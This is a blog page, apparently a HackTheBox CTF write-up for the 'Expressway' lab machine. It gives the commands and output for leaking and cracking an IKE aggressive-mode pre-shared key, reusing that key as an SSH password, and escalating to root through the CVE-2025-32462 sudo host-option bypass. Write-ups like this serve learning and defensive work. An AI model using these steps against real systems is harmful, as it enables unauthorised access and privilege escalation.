@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script>if(localStorage.getItem('ocb-theme')==='light')document.documentElement.classList.add('light-mode');</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="HackTheBox Expressway writeup — IKE aggressive mode PSK leak, credential reuse to SSH, and CVE-2025-32462 sudo host policy bypass to root.">
+
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'sha256-UBl4nLwKa5omrxuOUtH1s2RUUw9imT+HAxiRkiPAyTo=' 'sha256-tPqkbt4ef+MNL3m5ZYl3N2iuh38+p5F+QuOpBiXqN2g=' https://www.googletagmanager.com; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com; connect-src 'self' https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'none';">
+  <meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+
+  <!-- Open Graph -->
+  <meta property="og:type"        content="article">
+  <meta property="og:site_name"   content="onecybit">
+  <meta property="og:title"       content="HackTheBox — Expressway — onecybit">
+  <meta property="og:description" content="HackTheBox Expressway writeup — IKE aggressive mode PSK leak, credential reuse to SSH, and CVE-2025-32462 sudo host policy bypass to root.">
+  <meta property="og:url"         content="https://onecybit.github.io/posts/cybersecurity/ctf/expressway/">
+  <meta property="og:image"       content="https://onecybit.github.io/assets/img/OneCyBit_logo_compressed.jpg">
+  <meta name="twitter:card"        content="summary_large_image">
+  <meta name="twitter:title"       content="HackTheBox — Expressway — onecybit">
+  <meta name="twitter:description" content="HackTheBox Expressway writeup — IKE aggressive mode PSK leak, credential reuse to SSH, and CVE-2025-32462 sudo host policy bypass to root.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"HackTheBox — Expressway","datePublished":"2026-04-24","description":"HackTheBox Expressway writeup — IKE aggressive mode PSK leak, credential reuse to SSH, and CVE-2025-32462 sudo host policy bypass to root.","url":"https://onecybit.github.io/posts/cybersecurity/ctf/expressway/","author":{"@type":"Person","name":"onecybit"}}</script>
+
+  <title>HackTheBox — Expressway — onecybit</title>
+
+  <link rel="canonical" href="https://onecybit.github.io/posts/cybersecurity/ctf/expressway/">
+  <link rel="alternate" type="application/rss+xml" title="onecybit" href="https://onecybit.github.io/feed.xml">
+  <link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link
+    rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@100;300;700;900&family=Share+Tech+Mono&display=swap"
+  >
+
+  <!-- Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-L2TK63YC14"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-L2TK63YC14');</script>
+</head>
+
+<body>
+
+  <div class="scroll-progress" aria-hidden="true"></div>
+
+  <!-- ── SHARED: update all pages if this changes ── -->
+  <div class="grid-bg"   aria-hidden="true"></div>
+  <div class="scanlines" aria-hidden="true"></div>
+  <div class="noise"     aria-hidden="true"></div>
+  <!-- ── END SHARED ── -->
+
+  <header class="site-header">
+    <nav class="nav container" role="navigation" aria-label="Main navigation">
+      <a href="/" class="nav-logo" aria-label="onecybit — home">
+        <span class="nav-logo-text" data-glitch="onecybit">onecybit</span>
+      </a>
+
+      <ul class="nav-links" id="js-nav-links" role="list">
+        <li><a href="/"               class="nav-link">home</a></li>
+        <li><a href="/cybersecurity/" class="nav-link">cybersecurity</a></li>
+        <li><a href="/projects/"      class="nav-link">projects</a></li>
+        <li><a href="/news/"          class="nav-link">news</a></li>
+        <li><a href="/notes/"         class="nav-link">notes</a></li>
+        <li><a href="/tags/"          class="nav-link">tags</a></li>
+        <li><a href="/about.html"     class="nav-link">about</a></li>
+      </ul>
+
+      <button class="nav-hamburger" id="js-nav-hamburger" aria-label="Open navigation menu" aria-expanded="false" aria-controls="js-nav-links">
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+      </button>
+
+      <button class="theme-toggle" id="js-theme-toggle" aria-label="Toggle theme">night</button>
+
+      <time
+        class="nav-clock"
+        id="js-clock"
+        datetime=""
+        aria-live="polite"
+        aria-label="Current time"
+      ></time>
+    </nav>
+  </header>
+
+  <main>
+    <article class="section" aria-label="HackTheBox — Expressway">
+      <div class="container post-full">
+
+        <header class="post-full-header">
+          <nav class="post-breadcrumb" aria-label="Breadcrumb">
+            <a href="/">home</a>
+            <span class="post-breadcrumb-sep" aria-hidden="true">/</span>
+            <a href="/cybersecurity/">cybersecurity</a>
+            <span class="post-breadcrumb-sep" aria-hidden="true">/</span>
+            <span>ctf</span>
+          </nav>
+
+          <div class="post-full-meta">
+            <time class="post-date" datetime="2026-04-24">2026-04-24</time>
+            <span class="cat-badge cat-badge--writeup">ctf</span>
+            <span class="reading-time">4 min read</span>
+          </div>
+
+          <h1 class="post-full-title">HackTheBox — Expressway</h1>
+
+          <ul class="post-full-tags post-tags" aria-label="Tags">
+            <li class="post-tag">htb</li><li class="post-tag">ctf</li><li class="post-tag">ike</li><li class="post-tag">vpn</li><li class="post-tag">sudo</li><li class="post-tag">cve</li>
+          </ul>
+        </header>
+
+
+
+        <div class="post-body">
+          <p><strong>OS:</strong> Linux (Debian)<br>
+<strong>IP:</strong> 10.10.11.87</p>
+<hr>
+<h2 id="recon">Recon</h2>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">nmap -Pn -sC -sV -p- --min-rate 2000 -oN nmap-scan.txt 10.10.11.87</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)</code></pre></div>
+<p>Only SSH exposed on TCP. Run a UDP scan of the top ports:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">nmap -Pn -sU -sV -T3 --top-ports 25 -oN udp-nmap-scan.txt 10.10.11.87</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>PORT     STATE SERVICE VERSION
+500/udp  open  isakmp?</code></pre></div>
+<p>IKE/ISAKMP on 500/udp is a VPN handshake service. Worth checking for IKE Aggressive Mode with pre-shared keys — it leaks the PSK hash (offline-crackable) and embeds the group/user identity in the ID payload.</p>
+<hr>
+<h2 id="ike-aggressive-mode">IKE Aggressive Mode — PSK Hash + Identity Leak</h2>
+<p>IKE Phase 1 in Aggressive Mode with PSK authentication is structurally vulnerable: the responder sends back a hash of the PSK and a clear-text ID payload in a single round trip. An attacker on the network path can capture both offline with no prior credential.</p>
+<p>Probe the target for aggressive-mode handshake and extract the PSK parameters:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ike-scan --showbackoff -M -A -P -R 10.10.11.87</code></pre></div>
+<p>Flags:</p>
+<ul><li><code>-M</code> multiline output</li><li><code>-A</code> aggressive mode</li><li><code>-P</code> extract PSK hash + nonces in crackable format</li><li><code>-R</code> randomize host order</li></ul>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>10.10.11.87     Aggressive Mode Handshake returned
+    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+    Hash(20 bytes)</code></pre></div>
+<p>Two findings:</p>
+<ul><li><strong>Identity leaked:</strong> <code>ike@expressway.htb</code> — both a username (<code>ike</code>) and a vhost (<code>expressway.htb</code>).</li><li><strong>PSK hash extracted:</strong> <code>hash_r</code> and associated nonces are saved to <code>psk_key.txt</code> in ike-scan&#39;s native format for cracking.</li></ul>
+<hr>
+<h2 id="psk-cracking">PSK Cracking</h2>
+<p>Crack the captured PSK with <code>psk-crack</code> (shipped with ike-scan):</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">psk-crack -d /usr/share/wordlists/rockyou.txt psk_key.txt</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>key "freakingrockstarontheroad" matches SHA1 hash 3f03f7d89658933dc3f5a91641d534a4df936234</code></pre></div>
+<hr>
+<h2 id="foothold">Foothold — SSH with Reused PSK</h2>
+<p>The cracked PSK is reused as the SSH password for the <code>ike</code> user (identity taken from the IKE ID payload):</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ssh ike@10.10.11.87
+# password: freakingrockstarontheroad</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+ike@expressway:~$ cat user.txt</code></pre></div>
+<p>The <code>ike</code> user is in the <code>proxy</code> group. Enumerate what that grants:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">find / -group proxy -type d 2&gt;/dev/null</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>/run/squid
+/var/spool/squid
+/var/log/squid</code></pre></div>
+<p>Squid proxy logs are readable. Check the access log:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">cat /var/log/squid/access.log.1</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html</code></pre></div>
+<p>A second vhost, <code>offramp.expressway.htb</code>, is referenced. This becomes relevant for the sudo bypass below.</p>
+<hr>
+<h2 id="cve-2025-32462">CVE-2025-32462 — sudo <code>-h host</code> Policy Bypass</h2>
+<p>LinEnum flagged an unusual sudo path: <code>/usr/local/bin/sudo</code> instead of the distro default <code>/usr/bin/sudo</code>. Version check:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo -V</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>Sudo version 1.9.17</code></pre></div>
+<p>Sudo 1.9.17 is vulnerable to <strong>CVE-2025-32462</strong> — the &quot;Policy-Check Flaw.&quot; The <code>-h</code> / <code>--host</code> option was only ever intended for <code>sudo -l</code> (listing privileges against a named host), but in affected versions it could be passed to any invocation. This lets an attacker force sudo to evaluate host-specific policy for an arbitrary hostname; if that host&#39;s sudoers grants <code>NOPASSWD: ALL</code>, the command runs as root regardless of local policy.</p>
+<p>Check what policy applies when targeting the vhost discovered in the Squid log:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo -h offramp.expressway.htb -l</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>User ike may run the following commands on offramp:
+    (root) NOPASSWD: ALL</code></pre></div>
+<p>Apply the same host argument to an actual command to spawn a root shell:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo -h offramp.expressway.htb bash</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>root@expressway:/var/log/squid# cat /root/root.txt</code></pre></div>
+<hr>
+<h2 id="summary">Summary</h2>
+<table><thead><tr><th>Step</th><th>Technique</th><th>Detail</th></tr></thead><tbody><tr><td>1</td><td>UDP recon</td><td>500/udp (ISAKMP) found after initial TCP-only scan missed it</td></tr><tr><td>2</td><td>IKE aggressive mode</td><td><code>ike-scan -A -P</code> leaked PSK hash + <code>ike@expressway.htb</code> ID</td></tr><tr><td>3</td><td>PSK cracking</td><td><code>psk-crack</code> + rockyou &#x2192; <code>freakingrockstarontheroad</code></td></tr><tr><td>4</td><td>Credential reuse</td><td>PSK reused as SSH password for <code>ike</code> user</td></tr><tr><td>5</td><td>Log enumeration</td><td><code>proxy</code> group &#x2192; <code>/var/log/squid</code> &#x2192; <code>offramp.expressway.htb</code> vhost</td></tr><tr><td>6</td><td>CVE-2025-32462</td><td><code>sudo -h offramp.expressway.htb bash</code> &#x2192; root</td></tr></tbody></table>
+        </div>
+
+        <nav class="post-nav" aria-label="Post navigation">
+          <a class="post-nav-item post-nav-item--prev" href="/posts/projects/vless-vpn/ftarg-ch3-the-management-layer-bot-database-automation/"><span class="post-nav-label">&larr; older</span><span class="post-nav-title">Ftarg — Ch.3: The Management Layer — Bot, Database, Automation</span></a>
+          <a class="post-nav-item post-nav-item--next" href="/posts/cybersecurity/ctf/facts/"><span class="post-nav-label">newer &rarr;</span><span class="post-nav-title">HackTheBox — Facts</span></a>
+        </nav>
+
+      </div>
+    </article>
+
+  <section class="related-posts section" id="js-related-posts" aria-label="Related posts" hidden>
+    <div class="container">
+      <h2 class="section-title">// related posts</h2>
+      <div class="related-posts-grid" id="js-related-grid"></div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 onecybit</span>
+      <span class="footer-status">// status: <span class="status-ok">operational</span></span>
+    </div>
+  </footer>
+
+  <button class="back-to-top" id="js-back-top" aria-label="Back to top" hidden>&uarr;</button>
+
+  <script src="/assets/js/main.js" defer></script>
+  <script src="/assets/js/related.js" defer></script>
+
+</body>
+</html>
